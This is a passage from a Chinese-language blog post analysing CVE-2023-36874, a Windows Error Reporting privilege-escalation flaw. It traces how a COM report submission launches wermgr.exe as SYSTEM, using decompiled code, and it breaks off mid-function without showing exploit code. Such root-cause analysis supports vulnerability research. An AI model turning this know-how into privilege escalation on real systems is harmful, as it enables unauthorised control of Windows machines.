&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">virtual&lt;/span> HRESULT &lt;span style="color:#66d9ef">__stdcall&lt;/span> Proc19(&lt;span style="color:#75715e">/* Stack Offset: 8 */&lt;/span> &lt;span style="color:#66d9ef">int64_t&lt;/span>&lt;span style="color:#f92672">*&lt;/span> p0);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">virtual&lt;/span> HRESULT &lt;span style="color:#66d9ef">__stdcall&lt;/span> Proc20(&lt;span style="color:#75715e">/* Stack Offset: 8 */&lt;/span> BSTR p0, &lt;span style="color:#75715e">/* Stack Offset: 16 */&lt;/span> BSTR&lt;span style="color:#f92672">*&lt;/span> p1);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">virtual&lt;/span> HRESULT &lt;span style="color:#66d9ef">__stdcall&lt;/span> Proc21(&lt;span style="color:#75715e">/* Stack Offset: 8 */&lt;/span> BSTR&lt;span style="color:#f92672">*&lt;/span> p0);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">virtual&lt;/span> HRESULT &lt;span style="color:#66d9ef">__stdcall&lt;/span> Proc22(&lt;span style="color:#75715e">/* Stack Offset: 8 */&lt;/span> &lt;span style="color:#66d9ef">int64_t&lt;/span> p0, &lt;span style="color:#75715e">/* Stack Offset: 16 */&lt;/span> &lt;span style="color:#66d9ef">int64_t&lt;/span>&lt;span style="color:#f92672">*&lt;/span> p1, &lt;span style="color:#75715e">/* Stack Offset: 24 */&lt;/span> &lt;span style="color:#66d9ef">int64_t&lt;/span>&lt;span style="color:#f92672">*&lt;/span> p2, &lt;span style="color:#75715e">/* Stack Offset: 32 */&lt;/span> BSTR&lt;span style="color:#f92672">*&lt;/span> p3, &lt;span style="color:#75715e">/* Stack Offset: 40 */&lt;/span> BSTR&lt;span style="color:#f92672">*&lt;/span> p4);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">virtual&lt;/span> HRESULT &lt;span style="color:#66d9ef">__stdcall&lt;/span> Proc23(&lt;span style="color:#75715e">/* Stack Offset: 8 */&lt;/span> &lt;span style="color:#66d9ef">int64_t&lt;/span> p0, &lt;span style="color:#75715e">/* Stack Offset: 16 */&lt;/span> BSTR&lt;span style="color:#f92672">*&lt;/span> p1);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">virtual&lt;/span> HRESULT &lt;span style="color:#66d9ef">__stdcall&lt;/span> Proc24(&lt;span style="color:#75715e">/* Stack Offset: 8 */&lt;/span> BSTR p0, &lt;span style="color:#75715e">/* Stack Offset: 16 */&lt;/span> &lt;span style="color:#66d9ef">int64_t&lt;/span> p1, &lt;span style="color:#75715e">/* Stack Offset: 24 */&lt;/span> IWerReportSubmitCallback&lt;span style="color:#f92672">*&lt;/span> p2, &lt;span style="color:#75715e">/* Stack Offset: 32 */&lt;/span> &lt;span style="color:#75715e">/* unique */&lt;/span>BSTR&lt;span style="color:#f92672">*&lt;/span> p3, &lt;span style="color:#75715e">/* Stack Offset: 40 */&lt;/span> &lt;span style="color:#75715e">/* unique */&lt;/span>&lt;span style="color:#66d9ef">int64_t&lt;/span>&lt;span style="color:#f92672">*&lt;/span> p4);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">virtual&lt;/span> HRESULT &lt;span style="color:#66d9ef">__stdcall&lt;/span> Proc25();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这里需要知道Windows的[[../../../05 Windows/COM模型/COM模型 OVERVIEW|COM模型)，COM模型定义了二进制标准，以支持组件复用。将操作系统API抽象成了接口，可以通过接口的标识符实例化COM对象并通过COM对象调用服务接口。即&lt;/p>
&lt;p>当使用COM接口调用error reporting 服务并提交错误报告时，error reporting会启动 &lt;code>C:\Windows\System32\wermgr.exe&lt;/code>，并且启动时权限为 &lt;code>NT AUTHORITY\SYSTEM&lt;/code>。
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-36874-windows-error-reporting-service-eop.zh-cn.assets/20230912112511.png" />&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-36874-windows-error-reporting-service-eop.zh-cn.assets/20230912112524.png" />&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-36874-windows-error-reporting-service-eop.zh-cn.assets/20230912112334.png" />&lt;/p>
&lt;p>&lt;strong>追溯调用栈&lt;/strong>
查看此事件的调用栈，&lt;code>wer!WerpAuxmdMapFile+0x3887d&lt;/code> 处调用了&lt;code>CreateProcessW&lt;/code>&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-36874-windows-error-reporting-service-eop.zh-cn.assets/20230912112618.png" />&lt;/p>
&lt;p>&lt;code>wer!WerpAuxmdMapFile+0x3887d&lt;/code>位于 &lt;code>UtilLaunchWerManager&lt;/code>函数内，代码如下&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">__int64&lt;/span> &lt;span style="color:#66d9ef">__fastcall&lt;/span> &lt;span style="color:#a6e22e">UtilLaunchWerManager&lt;/span>(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int16&lt;/span> &lt;span style="color:#f92672">**&lt;/span>a1,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">__int64&lt;/span> a2,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">__int64&lt;/span> a3,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>a4,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">**&lt;/span>a5,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">**&lt;/span>a6,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> a7,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">**&lt;/span>a8)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ....
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> WCHAR Buffer[&lt;span style="color:#ae81ff">264&lt;/span>]; &lt;span style="color:#75715e">// [rsp+148h] [rbp+40h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v43 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v39 &lt;span style="color:#f92672">=&lt;/span> a1;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v8 &lt;span style="color:#f92672">=&lt;/span> a5;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lpValue &lt;span style="color:#f92672">=&lt;/span> a8;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">memset_0&lt;/span>(Buffer, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0x208u&lt;/span>i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lpCommandLine[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lpCommandLine[&lt;span style="color:#ae81ff">1&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .....
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_67;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v11 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">StringCchCatW&lt;/span>(Buffer, &lt;span style="color:#ae81ff">0x104u&lt;/span>i64, &lt;span style="color:#e6db74">L&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">wermgr.exe&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v12 &lt;span style="color:#f92672">=&lt;/span> v11;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v11 &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v12 &lt;span style="color:#f92672">=&lt;/span> CString&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#a6e22e">Sprintf&lt;/span>((CString &lt;span style="color:#f92672">*&lt;/span>)lpCommandLine, &lt;span style="color:#e6db74">L&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\&amp;#34;&lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#ae81ff">\&amp;#34;&lt;/span>&lt;span style="color:#e6db74"> &amp;#34;&lt;/span>, Buffer);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( (v12 &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">0x80000000&lt;/span>) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( WPP_GLOBAL_Control &lt;span style="color:#f92672">!=&lt;/span> (HKEY)&lt;span style="color:#f92672">&amp;amp;&lt;/span>WPP_GLOBAL_Control &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> ((_BYTE)WPP_GLOBAL_Control[&lt;span style="color:#ae81ff">7&lt;/span>] &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">WPP_SF_S&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>((_QWORD &lt;span style="color:#f92672">*&lt;/span>)WPP_GLOBAL_Control &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>), &lt;span style="color:#ae81ff">20&lt;/span>i64, &lt;span style="color:#f92672">&amp;amp;&lt;/span>WPP_80b9a2815f1633611b5141c011dbf465_Traceguids, Buffer);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_37;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_38;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v13 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v14 &lt;span style="color:#f92672">=&lt;/span> lpCommandLine[&lt;span style="color:#ae81ff">0&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> ( v13 &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0xE&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .....
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v19 &lt;span style="color:#f92672">=&lt;/span> CString&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#a6e22e">Append&lt;/span>((CString &lt;span style="color:#f92672">*&lt;/span>)lpCommandLine, v40[&lt;span style="color:#ae81ff">0&lt;/span>]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v19 &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#f92672">||&lt;/span> WPP_GLOBAL_Control &lt;span style="color:#f92672">==&lt;/span> (HKEY)&lt;span style="color:#f92672">&amp;amp;&lt;/span>WPP_GLOBAL_Control &lt;span style="color:#f92672">||&lt;/span> ((_BYTE)WPP_GLOBAL_Control[&lt;span style="color:#ae81ff">7&lt;/span>] &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v14 &lt;span style="color:#f92672">=&lt;/span> lpCommandLine[&lt;span style="color:#ae81ff">0&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ....
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#a6e22e">UpdateProcThreadAttribute&lt;/span>(v10, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0x20002u&lt;/span>i64, lpValue, &lt;span style="color:#ae81ff">8&lt;/span>i64 &lt;span style="color:#f92672">*&lt;/span> a7, &lt;span style="color:#ae81ff">0&lt;/span>i64, &lt;span style="color:#ae81ff">0&lt;/span>i64) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> StartupInfo.cb &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">112&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v45 &lt;span style="color:#f92672">=&lt;/span> v10;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#a6e22e">CreateProcessW&lt;/span>(Buffer, v14, &lt;span style="color:#ae81ff">0&lt;/span>i64, &lt;span style="color:#ae81ff">0&lt;/span>i64, &lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">0x80000u&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>i64, &lt;span style="color:#ae81ff">0&lt;/span>i64, &lt;span style="color:#f92672">&amp;amp;&lt;/span>StartupInfo, &lt;span style="color:#f92672">&amp;amp;&lt;/span>hObject) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v12 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>向上追溯调用栈，&lt;code>UtilLaunchWerManager&lt;/code>函数由 &lt;code>CReportManager::ReportProblemOutOfProcess&lt;/code>调用， 再上层函数为&lt;code>CReportManager::ReportProblem&lt;/code>，&lt;code>CReportManager::ReportProblem&lt;/code>由&lt;code>ReportHandleInstance::SubmitReport&lt;/code>调用，&lt;code>在上层函数为WerpSubmitReportFromStore&lt;/code>。在&lt;code>wecplsupport!DllCanUnloadNew+0x2bf2&lt;/code>处调用了&lt;code>wer.dll!WerpSubmitReportFromStore&lt;/code>函数。&lt;/p>
&lt;p>&lt;code>wercplsupport!DllCanUnloadNew+0x2bf2&lt;/code>实际位于 &lt;code>wercplsupport!CWerComReport::_SubmitReport&lt;/code>函数内，代码如下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">__int64&lt;/span> &lt;span style="color:#66d9ef">__fastcall&lt;/span> CWerComReport&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#a6e22e">_SubmitReport&lt;/span>(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">**&lt;/span>this,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int16&lt;/span> &lt;span style="color:#f92672">*&lt;/span>a2,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> a3,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">struct&lt;/span> IUnknown &lt;span style="color:#f92672">*&lt;/span>a4,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int16&lt;/span> &lt;span style="color:#f92672">**&lt;/span>a5,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#f92672">*&lt;/span>a6)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v24 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>CStubUI&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>vftable&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( a4 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ((&lt;span style="color:#66d9ef">void&lt;/span> (&lt;span style="color:#66d9ef">__fastcall&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(&lt;span style="color:#66d9ef">struct&lt;/span> IUnknown &lt;span style="color:#f92672">*&lt;/span>))a4&lt;span style="color:#f92672">-&amp;gt;&lt;/span>lpVtbl&lt;span style="color:#f92672">-&amp;gt;&lt;/span>AddRef)(a4);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v25 &lt;span style="color:#f92672">=&lt;/span> a4;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v23[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> TokenHandle &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v26 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v10 &lt;span style="color:#f92672">=&lt;/span> a5;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( a5 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">SysFreeString&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>a5);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v10 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> WerApiLock &lt;span style="color:#f92672">=&lt;/span> CWerApiAutoLock&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#a6e22e">TryGetWerApiLock&lt;/span>((CWerApiAutoLock &lt;span style="color:#f92672">*&lt;/span>)v23, (&lt;span style="color:#66d9ef">struct&lt;/span> CWerComReport &lt;span style="color:#f92672">*&lt;/span>)this);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( WerApiLock &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>.....
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> CurrentThread &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">GetCurrentThread&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#a6e22e">OpenThreadToken&lt;/span>(CurrentThread, &lt;span style="color:#ae81ff">0xF01FFu&lt;/span>, &lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#f92672">&amp;amp;&lt;/span>TokenHandle) &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#a6e22e">GetLastError&lt;/span>() &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">1008&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .....
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> WerApiLock &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">WerpSubmitReportFromStore&lt;/span>(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>((&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">**&lt;/span>)this[&lt;span style="color:#ae81ff">5&lt;/span>] &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> a2,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> this[&lt;span style="color:#ae81ff">4&lt;/span>],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (&lt;span style="color:#66d9ef">struct&lt;/span> IReportUI &lt;span style="color:#f92672">*&lt;/span>)((&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>v24 &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#f92672">-&lt;/span>(&lt;span style="color:#66d9ef">__int64&lt;/span>)(a4 &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64)),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>v21,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> a3,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (&lt;span style="color:#66d9ef">enum&lt;/span> _WER_SUBMIT_RESULT &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>v20);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>.....
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>_SubmitReport&lt;/code>由 &lt;code>CWerComReport::SubmitReport&lt;/code>调用，而 &lt;code>CWerComReport::SubmitReport&lt;/code>为&lt;code>IWerReport&lt;/code>接口公开的函数。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">__int64&lt;/span> &lt;span style="color:#66d9ef">__fastcall&lt;/span> CWerComReport&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#a6e22e">SubmitReport&lt;/span>(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> CWerComReport &lt;span style="color:#f92672">*&lt;/span>this,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int16&lt;/span> &lt;span style="color:#f92672">*&lt;/span>a2,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> a3,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">struct&lt;/span> IWerReportSubmitCallback &lt;span style="color:#f92672">*&lt;/span>a4,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int16&lt;/span> &lt;span style="color:#f92672">**&lt;/span>a5,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#f92672">*&lt;/span>a6)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> v10; &lt;span style="color:#75715e">// ebx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> v12; &lt;span style="color:#75715e">// [rsp+30h] [rbp-18h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v13; &lt;span style="color:#75715e">// [rsp+38h] [rbp-10h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v13 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v12 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">!&lt;/span>CAutoImpersonate&lt;span style="color:#f92672">::&lt;/span>g_bEnableImpersonate
